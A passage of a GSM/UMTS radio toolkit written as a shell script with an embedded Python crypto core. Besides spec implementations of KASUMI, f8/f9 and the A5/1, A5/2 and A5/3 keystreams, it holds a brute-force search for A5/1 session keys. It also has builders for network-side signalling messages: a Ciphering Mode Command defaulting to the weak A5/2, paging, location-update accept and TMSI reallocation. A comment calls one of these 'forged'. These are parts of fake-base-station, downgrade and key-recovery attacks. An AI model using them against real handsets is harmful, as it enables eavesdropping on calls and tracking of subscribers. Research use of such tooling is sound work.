    kinit = Kasumi(bytes(a ^ b for a, b in zip(ck, KMF8)))
    A = int.from_bytes(kinit.enc(A.to_bytes(8, 'big')), 'big')
    m = Kasumi(ck)
    out = []
    ksb = 0
    for n in range(1, (cl + 63) // 64 + 1):
        blk = (A ^ (n - 1) ^ ksb) & 0xFFFFFFFFFFFFFFFF
        ksb = int.from_bytes(m.enc(blk.to_bytes(8, 'big')), 'big')
        out.append(format(ksb, '064b'))
    return ''.join(out)[:cl]


def f8(cK, count, bearer, direction, length_bits):
    """TS 35.201 section 3."""
    kinit = Kasumi(bytes(a ^ b for a, b in zip(cK, KMF8)))
    A = ((count & 0xFFFFFFFF) << 32) | ((bearer & 0x1F) << 27) | \
        ((direction & 1) << 26)
    A = int.from_bytes(kinit.enc(A.to_bytes(8, 'big')), 'big')
    m = Kasumi(cK)
    out = []
    ksb = 0
    for n in range(1, (length_bits + 63) // 64 + 1):
        blk = (A ^ (n - 1) ^ ksb) & 0xFFFFFFFFFFFFFFFF
        ksb = int.from_bytes(m.enc(blk.to_bytes(8, 'big')), 'big')
        out.append(format(ksb, '064b'))
    return ''.join(out)[:length_bits]


def f9(iK, count, fresh, direction, msg_hex, length_bits):
    """TS 35.201 section 4. Returns the 32-bit MAC-I."""
    bits = format(count & 0xFFFFFFFF, '032b') + format(fresh & 0xFFFFFFFF, '032b')
    msg = bytes.fromhex(msg_hex)
    bits += ''.join(format(b, '08b') for b in msg)[:length_bits]
    bits += str(direction & 1) + '1'
    while len(bits) % 64:
        bits += '0'
    m = Kasumi(iK)
    A = 0
    B = 0
    for n in range(len(bits) // 64):
        psn = int(bits[n * 64:(n + 1) * 64], 2)
        A = int.from_bytes(m.enc((A ^ psn).to_bytes(8, 'big')), 'big')
        B ^= A
    kmod = Kasumi(bytes(a ^ b for a, b in zip(iK, KMF9)))
    return (int.from_bytes(kmod.enc(B.to_bytes(8, 'big')), 'big') >> 32) & 0xFFFFFFFF


M1 = (1 << 19) - 1
M2 = (1 << 22) - 1
M3 = (1 << 23) - 1
M4 = (1 << 17) - 1
T1, T2, T3, T4 = 0x072000, 0x311000, 0x660000, 0x013100


def _par(x):
    return bin(x).count('1') & 1


def _clkone(r, mask, taps):
    return ((r << 1) & mask) | _par(r & taps)


class A52:
    """GSM A5/2. See the module header for the no-published-vectors note."""

    def __init__(self, kc, count):
        self.R1 = self.R2 = self.R3 = self.R4 = 0
        for i in range(64):
            self._clockall()
            kb = (kc >> i) & 1
            self.R1 ^= kb; self.R2 ^= kb; self.R3 ^= kb; self.R4 ^= kb
        for i in range(22):
            self._clockall()
            fb = (count >> i) & 1
            self.R1 ^= fb; self.R2 ^= fb; self.R3 ^= fb; self.R4 ^= fb
        for _ in range(99):
            m = _par(self.R4 & 0x7000)
            if m:
                self.R1 = _clkone(self.R1, M1, T1)
                self.R2 = _clkone(self.R2, M2, T2)
                self.R3 = _clkone(self.R3, M3, T3)
            self.R4 = _clkone(self.R4, M4, T4)
            if m:
                self.R4 = _clkone(self.R4, M4, T4)
        for _ in range(99):
            self.R4 = _clkone(self.R4, M4, T4)

    def _clockall(self):
        self.R1 = _clkone(self.R1, M1, T1)
        self.R2 = _clkone(self.R2, M2, T2)
        self.R3 = _clkone(self.R3, M3, T3)
        self.R4 = _clkone(self.R4, M4, T4)

    def _step(self):
        if _par(self.R4 & 0x7000):
            self.R1 = _clkone(self.R1, M1, T1)
            self.R2 = _clkone(self.R2, M2, T2)
            self.R3 = _clkone(self.R3, M3, T3)
        self.R4 = _clkone(self.R4, M4, T4)

    def bit(self):
        a = (self.R1 >> 18) & 1
        b = (self.R2 >> 21) & 1
        c = (self.R3 >> 22) & 1
        return a ^ b ^ c ^ ((a & b) ^ (a & c) ^ (b & c))

    def bits(self, n):
        o = []
        for _ in range(n):
            self._step()
            o.append(self.bit())
        return o


# ── A5/1 ────────────────────────────────────────────────────────────────
# Three LFSRs of 19, 22 and 23 bits, clocked by majority vote on the middle
# bit of each, output is the XOR of the top bit of each register. Reverse
# engineered by Briceno/Goldberg/Wagner (1998); the published reference
# design, which is why it is the one GSM cipher with an official vector.
#
# This lives in 11's own core rather than calling gair_a5_1_keystream from
# 06_gsm_air.sh, because a Kc search has to run whether or not that module
# was sourced first. The selftest asserts the two implementations agree, so
# the duplication cannot drift silently.
_R1MASK, _R2MASK, _R3MASK = 0x07FFFF, 0x3FFFFF, 0x7FFFFF
_R1MID,  _R2MID,  _R3MID  = 0x000100, 0x000400, 0x000400
_R1TAPS, _R2TAPS, _R3TAPS = 0x072000, 0x300000, 0x700080
_R1OUT,  _R2OUT,  _R3OUT  = 0x040000, 0x200000, 0x400000


class A51:
    """A5/1. kc is the key as a little-endian integer, count the 22-bit frame
    number (see the loader note in main())."""

    def __init__(self, kc, count):
        self.R1 = self.R2 = self.R3 = 0
        for i in range(64):
            self._clockall()
            kb = (kc >> i) & 1
            self.R1 ^= kb; self.R2 ^= kb; self.R3 ^= kb
        for i in range(22):
            self._clockall()
            fb = (count >> i) & 1
            self.R1 ^= fb; self.R2 ^= fb; self.R3 ^= fb
        for _ in range(100):
            self._step()

    def _clockall(self):
        self.R1 = _clkone(self.R1, _R1MASK, _R1TAPS)
        self.R2 = _clkone(self.R2, _R2MASK, _R2TAPS)
        self.R3 = _clkone(self.R3, _R3MASK, _R3TAPS)

    def _step(self):
        maj = (((self.R1 & _R1MID) != 0) + ((self.R2 & _R2MID) != 0) +
               ((self.R3 & _R3MID) != 0)) >= 2
        if ((self.R1 & _R1MID) != 0) == maj:
            self.R1 = _clkone(self.R1, _R1MASK, _R1TAPS)
        if ((self.R2 & _R2MID) != 0) == maj:
            self.R2 = _clkone(self.R2, _R2MASK, _R2TAPS)
        if ((self.R3 & _R3MID) != 0) == maj:
            self.R3 = _clkone(self.R3, _R3MASK, _R3TAPS)

    def bit(self):
        return _par(self.R1 & _R1OUT) ^ _par(self.R2 & _R2OUT) ^ \
               _par(self.R3 & _R3OUT)

    def bits(self, n):
        o = []
        for _ in range(n):
            self._step()          # clock first, then read — same as 06_gsm_air
            o.append(self.bit())
        return o


def _a51_kc_int(kc_hex):
    """Key octets arrive in transmission order; the loader consumes them
    LSB-first from the first transmitted octet, so the hex string is read as
    a little-endian integer. This is the convention the official BGW vector
    uses: {12,23,45,67,89,AB,CD,EF} loads as 0xEFCDAB8967452312."""
    if len(kc_hex) % 2:
        kc_hex = '0' + kc_hex
    octets = [kc_hex[i:i + 2] for i in range(0, len(kc_hex), 2)]
    return int(''.join(reversed(octets)) or '0', 16)


def _bits_to_hex(bits):
    """MSB-first packing, matching the on-air burst order."""
    out = ''
    for i in range(0, len(bits), 4):
        nib = bits[i:i + 4] + [0] * (4 - len(bits[i:i + 4]))
        out += '%x' % ((nib[0] << 3) | (nib[1] << 2) | (nib[2] << 1) | nib[3])
    return out
# Appended to the embedded core: subcommand dispatch for the shell wrappers.
import sys


def main():
    a = sys.argv[1:]
    cmd = a[0]
    if cmd == 'kasumi':
        k = bytes.fromhex(a[1]); b = bytes.fromhex(a[2])
        print(Kasumi(k).enc(b).hex().upper())
    elif cmd == 'kgcore':
        ck = bytes.fromhex(a[1])
        bits = kgcore(ck, int(a[2], 0), int(a[3], 0), int(a[4], 0),
                      int(a[5], 0), int(a[6], 0), int(a[7], 0))
        print(bits)
    elif cmd == 'f8':
        ck = bytes.fromhex(a[1])
        print(f8(ck, int(a[2], 0), int(a[3], 0), int(a[4], 0), int(a[5], 0)))
    elif cmd == 'f9':
        ik = bytes.fromhex(a[1])
        print('%08X' % f9(ik, int(a[2], 0), int(a[3], 0), int(a[4], 0), a[5], int(a[6], 0)))
    elif cmd == 'a52':
        c = A52(int(a[1], 16), int(a[2], 0))
        print(''.join(str(x) for x in c.bits(int(a[3], 0))))
    elif cmd == 'a52blocks':
        c = A52(int(a[1], 16), int(a[2], 0))
        out = []
        for _ in range(int(a[3], 0)):
            out.append('%029X' % int(''.join(str(x) for x in c.bits(114)), 2))
        print('\n'.join(out))
    elif cmd == 'a51':
        c = A51(_a51_kc_int(a[1]), int(a[2], 0))
        print(''.join(str(x) for x in c.bits(int(a[3], 0))))
    elif cmd == 'a51hex':
        c = A51(_a51_kc_int(a[1]), int(a[2], 0))
        print(_bits_to_hex(c.bits(int(a[3], 0))))
    elif cmd == 'kcsearch':
        # kcsearch <base-kc-hex> <vary-low-bits> <count> <wantbits-0/1> [max-tries]
        # Exhaustive search over the low VARY bits of the key *integer*
        # (post-loader). The known high bits stay fixed. Returns the first
        # key whose keystream prefix equals wantbits, or NOTFOUND.
        base = _a51_kc_int(a[1])
        vary = int(a[2], 0)
        count = int(a[3], 0)
        want = [1 if ch == '1' else 0 for ch in a[4].strip()]
        limit = int(a[5], 0) if len(a) > 5 and a[5] else (1 << vary)
        if vary < 0 or vary > 64:
            sys.stderr.write('ERROR\tvary-low-bits out of range 0..64\n'); sys.exit(2)
        if not want:
            sys.stderr.write('ERROR\twantbits must be a non-empty 0/1 string\n'); sys.exit(2)
        lowmask = (1 << vary) - 1
        base &= ~lowmask
        tries = 0
        found = None
        for cand in range(1 << vary):
            if tries >= limit:
                break
            tries += 1
            kc = base | (cand & lowmask)
            c = A51(kc, count)
            ok = True
            for w in want:                       # early-out on first mismatch
                if c.bits(1)[0] != w:
                    ok = False
                    break
            if ok:
                found = kc
                break
        if found is None:
            print('NOTFOUND\ttries=%d\tsearched=%d' % (tries, 1 << vary))
        else:
            octets = found.to_bytes(8, 'little').hex()
            print('FOUND\t%s\ttries=%d' % (octets, tries))
    elif cmd == 'a53':
        kc = bytes.fromhex(a[1]); count = int(a[2], 0); klen = int(a[3], 0)
        if klen == 64:    ck = kc + kc
        elif klen == 80:  ck = kc + kc[:6]
        elif klen == 128: ck = kc
        else:
            sys.stderr.write('ERROR\tKLEN must be 64, 80 or 128\n'); sys.exit(2)
        print(kgcore(ck, 0x0F, 0, count & 0x3FFFFF, 0, 0, 228))
    else:
        sys.stderr.write('ERROR\tunknown crypto subcommand\n')
        sys.exit(2)


if __name__ == '__main__':
    main()
PYGSM
)
    export GATK_CRYPTO_CORE
    return 0
}

# ── KASUMI (TS 35.202) ──────────────────────────────────────────────────
gatk_kasumi() {   # <key-hex-32> <block-hex-16>
    local key; key=$(gatk_norm_hex "${1:-}")
    local blk; blk=$(gatk_norm_hex "${2:-}")
    [[ "$key" =~ ^[0-9a-f]{32}$ ]] || {
        printf 'ERROR\tkasumi key must be 16 octets of hex (32 digits)\n' >&2; return 2; }
    [[ "$blk" =~ ^[0-9a-f]{16}$ ]] || {
        printf 'ERROR\tkasumi block must be 8 octets of hex (16 digits)\n' >&2; return 2; }
    gatk_crypto_load
    gatk_crypto kasumi "$key" "$blk"
}

# The hex helpers live at the top of the file (same contract as
# 06_gsm_air.sh: normalise away 0x/spaces/colons/dashes/dots, and treat a
# string as hex only when it is non-empty, even-length and all hex digits).
# They used to be defined a second time here with a laxer test that accepted
# the empty string and odd lengths, which silently disabled the validation
# every builder below relies on. Do not reintroduce a local copy.

# ── Mobile Station Classmark 1 (TS 24.008 10.5.1.5) ─────────────────────
# A type 3 information element, 2 octets: IEI 0x33 then one value octet.
#   octet 2: bit8 = spare (0) | bits7-6 = Revision level | bit5 = ES IND
#            bit4 = A5/1 supported (INVERTED: 0 = available) | bits3-1 = RF power
GATK_CLASSMARK1_IEI=0x33

gatk_classmark1_decode() {   # <value-octet-hex>
    local o; o=$(gatk_norm_hex "${1:-}")
    [[ "$o" =~ ^[0-9a-f]{2}$ ]] || {
        printf 'ERROR\tclassmark 1 value octet must be one octet of hex\n' >&2; return 2; }
    local v=$((16#$o))
    local rev=$(( (v >> 5) & 0x03 ))
    local es=$((  (v >> 4) & 0x01 ))
    local a51=$(( (v >> 3) & 0x01 ))
    local pwr=$((  v & 0x07 ))
    printf 'octet\t%s\n' "$o"
    printf 'raw\t0x%02X\n' "$v"
    printf 'revision-level\t%s\n' "$rev"
    printf 'revision-text\t%s\n' "$(gatk_classmark1_revision "$rev")"
    printf 'es-ind\t%s\n' "$es"
    printf 'es-ind-text\t%s\n' "$([[ $es -eq 1 ]] && echo 'Controlled Early Classmark Sending implemented' || echo 'Controlled Early Classmark Sending not implemented')"
    printf 'a5-1-available\t%s\n' "$([[ $a51 -eq 0 ]] && echo yes || echo no)"
    printf 'rf-power-capability\t%s\n' "$pwr"
    printf 'rf-power-text\t%s\n' "$(gatk_classmark1_power "$pwr")"
}

gatk_classmark1_revision() {
    case "${1:-0}" in
        0) echo 'GSM phase 1' ;;
        1) echo 'GSM phase 2' ;;
        2) echo 'R99 or later' ;;
        3) echo 'reserved for future use' ;;
        *) echo 'unknown' ;;
    esac
}

gatk_classmark1_power() {
    case "${1:-0}" in
        0) echo 'class 1' ;;
        1) echo 'class 2' ;;
        2) echo 'class 3' ;;
        3) echo 'class 4' ;;
        4) echo 'class 5' ;;
        5) echo 'reserved (or "class 6" on some bands)' ;;
        6) echo 'reserved' ;;
        7) echo 'RF power capability irrelevant (UMTS / multiband)' ;;
        *) echo 'unknown' ;;
    esac
}

# --classmark1-encode <rev> <power> <es> <a5-1-available>
gatk_classmark1_encode() {   # <rev0-3> <power0-7> <es0|1> <a51avail0|1>
    local rev="${1:-1}" pwr="${2:-4}" es="${3:-0}" avail="${4:-1}"
    [[ "$rev" =~ ^[0-3]$ ]] || { printf 'ERROR\trevision level must be 0..3\n' >&2; return 2; }
    [[ "$pwr" =~ ^[0-7]$ ]] || { printf 'ERROR\trf power capability must be 0..7\n' >&2; return 2; }
    [[ "$es"  =~ ^[01]$ ]]  || { printf 'ERROR\tes-ind must be 0 or 1\n' >&2; return 2; }
    [[ "$avail" =~ ^[01]$ ]] || { printf 'ERROR\ta5-1-available must be 0 or 1\n' >&2; return 2; }
    # TS 24.008 figure 10.5.5, bit 1 = LSB: bits 7-6 revision, bit 5 ES IND,
    # bit 4 A5/1 (0 = available, 1 = not available), bits 3-1 RF power.
    local a51=$(( avail == 1 ? 0 : 1 ))
    local v=$(( ((rev & 3) << 5) | ((es & 1) << 4) | (a51 << 3) | (pwr & 7) ))
    printf '%02x\n' "$v"
}

# ── Mobile Station Classmark 3 (TS 24.008 10.5.1.7) ─────────────────────
# A variable-length bit-fields structure. Decoding all ~60 optional fields
# correctly requires the full figure 10.5.8 ladder; what is implemented here
# is the definite-length prefix the toolkit can state without guessing, and
# everything past it is reported as raw remaining bits rather than invented.
gatk_classmark3_decode() {   # <hex-octets>
    local h; h=$(gatk_norm_hex "${1:-}")
    gatk_is_hex "$h" || { printf 'ERROR\tclassmark 3 must be hex\n' >&2; return 2; }
    (( ${#h} % 2 == 0 )) || { printf 'ERROR\tclassmark 3 must be whole octets\n' >&2; return 2; }
    local n=$(( ${#h} / 2 ))
    (( n >= 1 )) || { printf 'ERROR\tclassmark 3 needs at least one octet\n' >&2; return 2; }
    printf 'octets\t%s\n' "$h"
    printf 'length-octets\t%s\n' "$n"
    local first=$(( 16#${h:0:2} ))
    local multiband=$(( first & 0x01 ))
    printf 'raw-first-octet\t0x%02X\n' "$first"
    printf 'multiband-capability\t%s\n' "$([[ $multiband -eq 1 ]] && echo 'MS supports multiband' || echo 'MS is not multiband')"
    printf 'note\tfull Classmark 3 bit-ladder is not decoded; tail bits are not interpreted\n'
    return 0
}

# ── LAI / Mobile Identity helpers (TS 24.008 10.5.1.3 / 10.5.1.4) ───────
# LAI is a type 3 IE with 6 octets length: IEI 0x05 + 5 octets carrying
# MCC and MNC as swapped-nibble BCD, then the 2-octet LAC.
gatk_lai_encode() {   # <mcc-3digits> <mnc-2or3digits> <lac-hex4>
    local mcc="${1:-262}" mnc="${2:-01}" lac
    lac=$(gatk_norm_hex "${3:-0000}")
    [[ "$mcc" =~ ^[0-9]{3}$ ]] || { printf 'ERROR\tMCC must be 3 digits\n' >&2; return 2; }
    [[ "$mnc" =~ ^[0-9]{2,3}$ ]] || { printf 'ERROR\tMNC must be 2 or 3 digits\n' >&2; return 2; }
    [[ "$lac" =~ ^[0-9a-f]{4}$ ]] || { printf 'ERROR\tLAC must be 4 hex digits\n' >&2; return 2; }
    local m1=${mcc:0:1} m2=${mcc:1:1} m3=${mcc:2:1}
    local n1 n2 n3
    if (( ${#mnc} == 3 )); then n1=${mnc:0:1}; n2=${mnc:1:1}; n3=${mnc:2:1}
    else n1=${mnc:0:1}; n2=${mnc:1:1}; n3=f; fi
    # octet2 = MCC2 MCC1 ; octet3 = MNC3 MCC3 ; octet4 = MNC2 MNC1
    printf '05%s%s%s%s%s%s%s\n' "$m2" "$m1" "$n3" "$m3" "$n2" "$n1" "$lac"
}

gatk_lai_decode() {   # <lai-hex-with-iei>
    local h; h=$(gatk_norm_hex "${1:-}")
    [[ "$h" =~ ^05[0-9a-f]{10}$ ]] || {
        printf 'ERROR\tLAI must be IEI 0x05 plus 5 octets of hex\n' >&2; return 2; }
    local o2=${h:2:2} o3=${h:4:2} o4=${h:6:2} lac=${h:8:4}
    # Octet 2 = MCC digit 2 | MCC digit 1 (digit 1 in the LOW nibble).
    # Octet 3 = MNC digit 3 | MCC digit 3.
    # Octet 4 = MNC digit 2 | MNC digit 1.
    local m1="${o2:1:1}" m2="${o2:0:1}" m3="${o3:1:1}"
    local n3="${o3:0:1}" n2="${o4:0:1}" n1="${o4:1:1}"
    local mcc="${m1}${m2}${m3}"
    local mnc
    if [[ "$n3" == "f" ]]; then mnc="${n1}${n2}"; else mnc="${n1}${n2}${n3}"; fi
    printf 'mcc\t%s\n' "$mcc"
    printf 'mnc\t%s\n' "$mnc"
    printf 'lac\t%s\n' "$lac"
    printf 'lac-dec\t%s\n' "$((16#$lac))"
}

# Mobile Identity is a type 3 IE. TMSI/P-TMSI form: IEI 0x17, length 0x05,
# then octet 3 = (odd/even << 3) | type-of-identity, then 4 TMSI octets.
# Type of identity 100 = TMSI/P-TMSI/M-TMSI.
gatk_mobile_identity_tmsi() {   # <tmsi-hex8>
    local t; t=$(gatk_norm_hex "${1:-}")
    [[ "$t" =~ ^[0-9a-f]{8}$ ]] || {
        printf 'ERROR\tTMSI must be 8 hex digits (4 octets)\n' >&2; return 2; }
    # Octet 3 = (odd/even indicator << 3) | type of identity. A 4-octet binary
    # TMSI is not BCD digits, so the odd/even indicator is set to 1 (encoded as
    # the nibble F in bits 5-8) and identity type 100 selects TMSI.
    printf '1705f4%s\n' "$t"
}

gatk_mobile_identity_imsi() {   # <imsi-digits-6..15>
    local d="${1:-}"
    [[ "$d" =~ ^[0-9]{6,15}$ ]] || {
        printf 'ERROR\tIMSI must be 6..15 digits\n' >&2; return 2; }
    # Pad the last odd position with F, then swap each nibble pair.
    local pad="$d"
    if (( ${#pad} % 2 )); then pad="${pad}f"; fi
    local out=""
    local i
    for (( i=0; i<${#pad}; i+=2 )); do out+="${pad:$((i+1)):1}${pad:$i:1}"; done
    local len=$(( ${#out} / 2 + 1 ))
    printf '17%02x%x%s\n' "$len" 1 "$out"
}

gatk_mobile_identity_decode() {   # <mobile-identity-hex-with-iei>
    local h; h=$(gatk_norm_hex "${1:-}")
    [[ "$h" =~ ^17[0-9a-f]{2,} ]] || {
        printf 'ERROR\tMobile Identity must start with IEI 0x17 and a length octet\n' >&2; return 2; }
    local len=$((16#${h:2:2}))
    local body=${h:4}
    (( ${#body} / 2 == len )) || {
        printf 'ERROR\tMobile Identity length octet (%d) disagrees with %d octets present\n' \
               "$len" "$(( ${#body} / 2 ))" >&2; return 2; }
    local o3=$((16#${body:0:2}))
    # Octet 3 = odd/even indicator in bit 4 (mask 0x08), type of identity in bits 3-1.
    local oei=$(( (o3 >> 3) & 1 ))
    local toi=$(( o3 & 0x07 ))
    printf 'type-of-identity\t%s\n' "$toi"
    case "$toi" in
        1) printf 'type-text\tIMSI\n' ;;
        2) printf 'type-text\tIMEI\n' ;;
        3) printf 'type-text\tIMEISV\n' ;;
        4) printf 'type-text\tTMSI/P-TMSI/M-TMSI\n' ;;
        5) printf 'type-text\tTMGI and optional MBMS Session Identity\n' ;;
        0) printf 'type-text\tNo Identity\n' ;;
        *) printf 'type-text\treserved\n' ;;
    esac
    printf 'odd-even-indicator\t%s\n' "$oei"
    if [[ "$toi" == "4" ]]; then
        printf 'tmsi\t%s\n' "${body:2}"
    fi
}

# ── RR: CIPHERING MODE COMMAND (TS 44.018 9.1.9 / 10.5.2.9) ────────────
# PD = 0x06 (RR management) | MT = 0x35 | Cipher Mode Setting | Cipher Response.
# Cipher Mode Setting (type 1 TV, 1 octet): bits 4-2 = algorithm identifier,
# bit 1 = SC (0 = do not start ciphering, 1 = start ciphering).
# The identifier is 0-based on the wire but 1-based in the spec table:
#   wire 000 -> A5/1, 001 -> A5/2, 010 -> A5/3, 011 -> A5/4, 100 -> A5/5 ...
gatk_alg_wire_code() {   # <A5/n> -> wire identifier
    case "${1:-}" in
        A5/0|a5/0|0) echo 0 ;;
        A5/1|a5/1|1) echo 0 ;;
        A5/2|a5/2|2) echo 1 ;;
        A5/3|a5/3|3) echo 2 ;;
        A5/4|a5/4|4) echo 3 ;;
        A5/5|a5/5|5) echo 4 ;;
        A5/6|a5/6|6) echo 5 ;;
        A5/7|a5/7|7) echo 6 ;;
        *) return 1 ;;
    esac
}

gatk_alg_name() {   # wire identifier -> label
    case "${1:-}" in
        0) echo 'A5/1' ;;
        1) echo 'A5/2' ;;
        2) echo 'A5/3' ;;
        3) echo 'A5/4' ;;
        4) echo 'A5/5' ;;
        5) echo 'A5/6' ;;
        6) echo 'A5/7' ;;
        *) echo 'reserved' ;;
    esac
}

gatk_build_cipher_mode() {   # <A5/n> [cr]
    local alg="${1:-A5/2}" cr="${2:-0}" code
    code=$(gatk_alg_wire_code "$alg") || {
        printf 'ERROR\tunknown cipher algorithm "%s" (want A5/1..A5/7)\n' "$alg" >&2; return 2; }
    [[ "$cr" =~ ^[01]$ ]] || { printf 'ERROR\tcipher response must be 0 or 1\n' >&2; return 2; }
    local cms=$(( (code << 1) | 1 ))
    # Cipher Response: IEI nibble 0x04, CR in bit 5. The bit position is not
    # what a reading of the figure suggests - table 10.5.2.10.1 prints the CR
    # bit as "1", and the alarmingly common reading of that is bit 4. Adjudicated
    # against Wireshark's gsm_a dissector, which is the independent
    # implementation available here: only octets with bit 5 set decode as
    # "...1 .... = CR: IMEISV shall be included". With CR in bit 4 a forged
    # cr=1 command decodes as cr=0, so the parameter silently does nothing.
    local cr_octet=$(( (cr << 4) | 4 ))
    printf '06'                                                    # PD (RR)
    printf '35'                                                    # MT CIPHERING MODE COMMAND
    printf '%02x' "$cms"
    printf '%02x' "$cr_octet"
    printf '\n'
}

# ── RR: PAGING REQUEST TYPE 1 (TS 44.018 9.1.22) ───────────────────────
# PD 0x06 | MT 0x21 | octet3: bits 2-1 = paging group (channel needed),
# bits 4-3 = 00 for type 1 | Channel Needed (optional) | Mobile Identity.
gatk_build_paging_request() {   # <tmsi-hex8> [paging-group 0..3]
    local t; t=$(gatk_norm_hex "${1:-}")
    [[ "$t" =~ ^[0-9a-f]{8}$ ]] || {
        printf 'ERROR\tpaging-request needs an 8-hex-digit TMSI\n' >&2; return 2; }
    local grp="${2:-0}"
    [[ "$grp" =~ ^[0-3]$ ]] || { printf 'ERROR\tpaging group must be 0..3\n' >&2; return 2; }
    printf '06'          # PD (RR)
    printf '21'          # MT PAGING REQUEST TYPE 1
    printf '%02x' "$(( grp & 0x03 ))"
    gatk_mobile_identity_tmsi "$t"
    printf '\n'
}

# ── MM: LOCATION UPDATING ACCEPT (TS 24.008 9.2.13) ───────────────────
# PD 0x05 | skip 0x00 | MT 0x02 | LAI (M, V, 5 octets, NO IEI) |
# Mobile Identity (O, TLV, IEI 0x17).
gatk_build_lu_accept() {   # <tmsi-hex8> [mcc] [mnc] [lac]
    local t; t=$(gatk_norm_hex "${1:-}")
    [[ "$t" =~ ^[0-9a-f]{8}$ ]] || {
        printf 'ERROR\tlu-accept needs an 8-hex-digit TMSI\n' >&2; return 2; }
    printf '05'      # PD (MM)
    printf '00'      # skip indicator
    printf '02'      # MT LOCATION UPDATING ACCEPT
    # LAI is V-format here: the 5 value octets carry no IEI.
    gatk_lai_encode "${2:-262}" "${3:-01}" "${4:-0000}" | cut -c3-
    gatk_mobile_identity_tmsi "$t"
    printf '\n'
}

# ── MM: TMSI REALLOCATION COMMAND (TS 24.008 9.2.20) ──────────────────
# PD 0x05 | skip 0x00 | MT 0x1a | LAI (M, V, 5 octets) |
# Mobile Identity (M, LV -- a length octet but NO IEI).
gatk_build_tmsi_realloc() {   # <tmsi-hex8> [mcc] [mnc] [lac]
    local t; t=$(gatk_norm_hex "${1:-}")
    [[ "$t" =~ ^[0-9a-f]{8}$ ]] || {
        printf 'ERROR\ttmsi-realloc needs an 8-hex-digit TMSI\n' >&2; return 2; }
    printf '05'      # PD (MM)
    printf '00'      # skip indicator
    printf '1a'      # MT TMSI REALLOCATION COMMAND
    gatk_lai_encode "${2:-262}" "${3:-01}" "${4:-0000}" | cut -c3-
    # Mobile Identity in LV format: a length octet first, then the value octet
    # (odd/even | type of identity = F4 for a 4-octet TMSI) and 4 TMSI octets.
    # No IEI in the LV form.
    printf '05f4%s' "$t"
    printf '\n'
}

# ── A5/2 keystream ──────────────────────────────────────────────────────
# A5/2 is the deliberately weakened export variant. NO public specification
# and NO public test vectors exist: GSM MoU SG.52 (the algorithm) and SG.53
# (24 sets of test data) are confidential, as ETSI ETR 278 section 8.3 states
# explicitly. The structure implemented here is the one published by the
# cryptanalysis literature (Goldberg/Wagner 1999; Barkan/Biham/Keller,
# "Instant Ciphertext-Only Cryptanalysis of GSM Encrypted Communication",
# CRYPTO 2003): four LFSRs of length 19, 22, 23 and 17, majority-clocked on
# three taps of the 17-bit register, combined by a nonlinear function.
#
# What that means for a reader: this generator is CORRECT AS SPECIFIED BY THE
# PUBLIC LITERATURE but it is NOT certified against an official vector,
# because no official vector is public. Treat --a5-2-keystream output as a
# well-formed A5/2 keystream, not as a known-answer-verified one. The A5/1
# keystream in 06_gsm_air.sh is the one with an official vector.
gatk_a5_2_bits() {   # <kc-hex16> <count-dec-or-hex> [bits]
    local kc; kc=$(gatk_norm_hex "${1:-}")
    local cnt="${2:-0}"
    local bits="${3:-228}"
    [[ "$kc" =~ ^[0-9a-f]{16}$ ]] || {
        printf 'ERROR\ta5-2-keystream needs a 64-bit Kc in hex (16 digits)\n' >&2; return 2; }
    [[ "$bits" =~ ^[0-9]+$ ]] && (( bits > 0 && bits <= 11400 )) || {
        printf 'ERROR\tbit count must be 1..11400\n' >&2; return 2; }
    [[ "$cnt" =~ ^(0[xX][0-9a-fA-F]+|[0-9]+)$ ]] || {
        printf 'ERROR\tCOUNT must be a number\n' >&2; return 2; }
    gatk_crypto_load
    gatk_crypto a52 "$kc" "$cnt" "$bits"
}

# ── A5/3 / A5/4 keystream (TS 55.216) ───────────────────────────────────
# A5/3 = KGCORE with CA=0x0F, CB=0, CD=0, CE=0, CC=COUNT (22 bits), CL=228,
# and CK = KC||KC when KC is 64 bits. A5/4 is the same function with a
# 128-bit key (KLEN=128), which is the entire difference between the two.
# Both are verified against the 3GPP A5/3 implementors' test data.
gatk_a5_3_bits() {   # <kc-hex> <count> [klen] [bits]
    local kc; kc=$(gatk_norm_hex "${1:-}")
    local cnt="${2:-0}"
    local klen="${3:-64}"
    local bits="${4:-228}"
    [[ "$kc" =~ ^[0-9a-f]+$ ]] && (( ${#kc} % 2 == 0 )) || {
        printf 'ERROR\ta5-3-keystream needs an even number of hex digits\n' >&2; return 2; }
    case "$klen" in
        64)  [[ ${#kc} -eq 16 ]] || { printf 'ERROR\tKLEN=64 needs a 16-hex-digit Kc\n' >&2; return 2; } ;;
        80)  [[ ${#kc} -eq 20 ]] || { printf 'ERROR\tKLEN=80 needs a 20-hex-digit Kc\n' >&2; return 2; } ;;
        128) [[ ${#kc} -eq 32 ]] || { printf 'ERROR\tKLEN=128 needs a 32-hex-digit Kc\n' >&2; return 2; } ;;
        *)   printf 'ERROR\tKLEN must be 64, 80 or 128\n' >&2; return 2 ;;
    esac
    [[ "$bits" =~ ^[0-9]+$ ]] && (( bits > 0 && bits <= 11400 )) || {
        printf 'ERROR\tbit count must be 1..11400\n' >&2; return 2; }
    gatk_crypto_load
    gatk_crypto a53 "$kc" "$cnt" "$klen" | cut -c1-"$bits"
}

gatk_a5_4_bits() {   # <kc-hex32> <count> [bits]
    local kc; kc=$(gatk_norm_hex "${1:-}")
    [[ "$kc" =~ ^[0-9a-f]{32}$ ]] || {
        printf 'ERROR\ta5-4-keystream needs a 128-bit key in hex (32 digits)\n' >&2; return 2; }
    gatk_a5_3_bits "$kc" "${2:-0}" 128 "${3:-228}"
}

# ── A5/1 keystream ──────────────────────────────────────────────────────
# A5/1 lives in this module's own core (see the A51 note there) so that a Kc
# search runs whether or not 06_gsm_air.sh was sourced first. When that
# module *is* loaded the selftest cross-checks the two, which is what stops
# the duplication drifting.
# A5/1's 22-bit COUNT is NOT the frame number. It is T1 (11 bits) || T3
# (6 bits) || T2 (5 bits) - the same split the SCH broadcasts, packed in that
# order (T3 before T2, which is the part everyone gets wrong). Verified
# against libosmocore's osmo_a5_fn_count(), which is what turns its real
# frame-number vectors into the count the A5/1 core actually consumes.
gatk_a5_count() {   # <frame-number 0..2715647>
    local fn="${1:-}"
    [[ "$fn" =~ ^[0-9]+$ ]] && (( fn <= GATK_MAX_FN )) || {
        printf 'ERROR\tframe number must be 0..%s\n' "$GATK_MAX_FN" >&2; return 2; }
    local t1=$(( fn / 1326 )) t2=$(( fn % 26 )) t3=$(( fn % 51 ))
    local cnt=$(( (t1 << 11) | (t3 << 5) | t2 ))
    printf 'fn\t%s\n' "$fn"
    printf 't1\t%s\n' "$t1"
    printf 't2\t%s\n' "$t2"
    printf 't3\t%s\n' "$t3"
